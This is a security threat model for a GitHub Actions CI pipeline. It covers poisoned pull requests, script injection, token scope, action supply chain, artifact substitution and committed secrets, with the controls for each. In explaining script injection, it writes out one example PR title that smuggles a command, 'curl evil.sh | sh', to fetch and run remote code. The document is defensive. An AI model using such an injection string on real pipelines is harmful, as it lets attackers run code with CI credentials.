# Security: threat model for the CI system itself

The pipeline scans the application, but the pipeline is also an attack
surface. It holds a token that can write to the repository and to code
scanning, and on `main` it can mint signing identities. This document covers
the attacks against CI and where each one is handled.

## Assets

| Asset | Why it matters |
|---|---|
| `GITHUB_TOKEN` | It can read the code, and depending on scopes push commits, write packages, write security events and create attestations |
| OIDC token (`id-token: write`) | Sigstore issues a signing certificate bound to this workflow's identity, so whoever holds it can sign images "as" the release pipeline |
| `SONAR_TOKEN`, `SNYK_TOKEN` | Third-party SaaS credentials |
| The image tar between jobs | If it is swapped after the scan, the signature covers bytes nobody scanned |
| The signature and provenance | Downstream admission policy trusts them |

## Threats and controls

### T1. Poisoned pull request (untrusted code with trusted credentials)

**Attack:** a fork PR changes a test, a Makefile or a Dockerfile `RUN` so
that it exfiltrates the token or secrets when CI runs it.

**Controls:**
- The caller triggers on `pull_request`, never `pull_request_target`. Fork PRs
  get a read-only token and no secrets, so Sonar and Snyk skip themselves and
  Trivy and Semgrep still run.
- `sign-and-attest` is gated on `publish && push && refs/heads/main`. No PR
  event can reach the OIDC token or `packages: write`.
- Linter rule **WF020** fails any workflow that uses `pull_request_target`
  and checks out the PR head (`github.event.pull_request.head.sha/ref`,
  `github.head_ref`, `refs/pull/...`).

### T2. Script injection through event data

**Attack:** a PR title like ``a"; curl evil.sh | sh; echo "`` is
interpolated by `${{ github.event.pull_request.title }}` into a `run:` block.
The runner substitutes the text *before* the shell parses it, so the title
becomes code.

**Controls:**
- In both workflows here, every value reaches scripts through `env:` and is
  quoted as `"$VAR"`. That includes trusted inputs, to keep one rule with no
  exceptions.
- Linter rule **WF030** flags user-controlled fields inside `run:` and inside
  `actions/github-script` `script:`. The fields covered are issue, PR,
  comment, review and discussion title/body; head ref/label; commit messages
  and author names; `workflow_run` head branch; `github.head_ref`; and
  `inputs`/`client_payload`.
- The gate passes `toJSON(needs)` through `env:` to a Python step and never
  splices it into code.

### T3. Over-scoped token

**Attack:** any compromised step (a malicious dependency, a hijacked action)
acts with the job token's full scope.

**Controls:**
- The top level of both workflows is `contents: read`. Each job widens only
  what it needs: `security-events: write` on the four SARIF uploaders, and
  `packages`, `id-token` and `attestations: write` on `sign-and-attest` only.
  The gate job has `permissions: {}`. A unit test asserts this mapping.
- The caller must grant the reusable workflow a ceiling that includes
  `id-token: write`, because GitHub validates nested permissions when the run
  starts. The called jobs narrow it again, so the OIDC permission is never
  present in a job that runs PR-controlled code.
- `persist-credentials: false` on every checkout (rule **WF050**), so later
  steps and uploaded artifacts cannot read the token from `.git/config`.
- Linter rules **WF001**, **WF002** and **WF040** catch a missing top-level
  `permissions`, `write-all`, and a top-level `id-token: write`.

### T4. Action and tool supply chain

**Attack:** an upstream action's tag is moved to a malicious commit. The
March 2025 `tj-actions/changed-files` compromise did exactly this, and its
payload dumped secrets into the logs of every workflow that used the tag.

**Controls:**
- Every action is pinned to a 40-character commit SHA with a `# vX.Y.Z`
  comment. Each SHA was resolved with `git ls-remote` against the upstream tag
  on 2026-10-14, and none was typed from memory. Rules **WF010** (third-party
  → error), **WF011** (first-party → warning) and **WF013** (SHA without a
  version comment) enforce this.
- Scanner images (Trivy, gitleaks, syft) and the app's base image are pinned
  by tag **and** index digest. The scanners run with `docker run`, not through
  wrapper actions, so a wrapper is one less dependency to trust.
- Semgrep is installed at an exact version. Hash-pinning it with
  `pip install --require-hashes` is a listed follow-up.
- Dependabot (`github-actions`, `docker`) should bump SHAs and digests through
  reviewed PRs. Configuring it is a repo-level follow-up.

### T5. Artifact substitution between scan and sign

**Attack:** a later job rebuilds the image, or swaps the tar, so the signed
image differs from the scanned one.

**Controls:** one build produces one tar. The scan, SBOM, DAST and sign jobs
all consume that artifact, and signing is by **registry digest**, never by
tag. Artifact retention is 1 day.

### T6. Secrets committed to the repository

**Controls:** gitleaks scans the PR range on PRs, the pushed range on push,
and full history on manual runs, and it fails the job. Allowlists are narrow
and carry their reasons (see operations.md §2). Rotation is "revoke first,
then purge" (operations.md §3).

### T7. Scanner blind spots and alert fatigue

**Risk:** a gate that is always red gets bypassed.

**Controls:** blocking is limited to fixable CRITICAL/HIGH findings
(`ignore-unfixed`), while SARIF still shows everything. Exceptions expire
within 180 days. DAST ignores only informational alerts.

## Residual risks (accepted, documented)

- The DAST target runs on the runner itself, so a malicious image could
  attack the runner during the ZAP job. Mitigations: it runs `--read-only
  --cap-drop ALL`, the port is bound to `127.0.0.1`, and the job has a
  `contents: read` token and no secrets.
- GitHub-hosted runner images and Docker Hub are trusted.
- The linter is a static, line-aware check. It does not resolve composite
  actions or reusable workflows from other repositories, so it cannot see
  their internals.
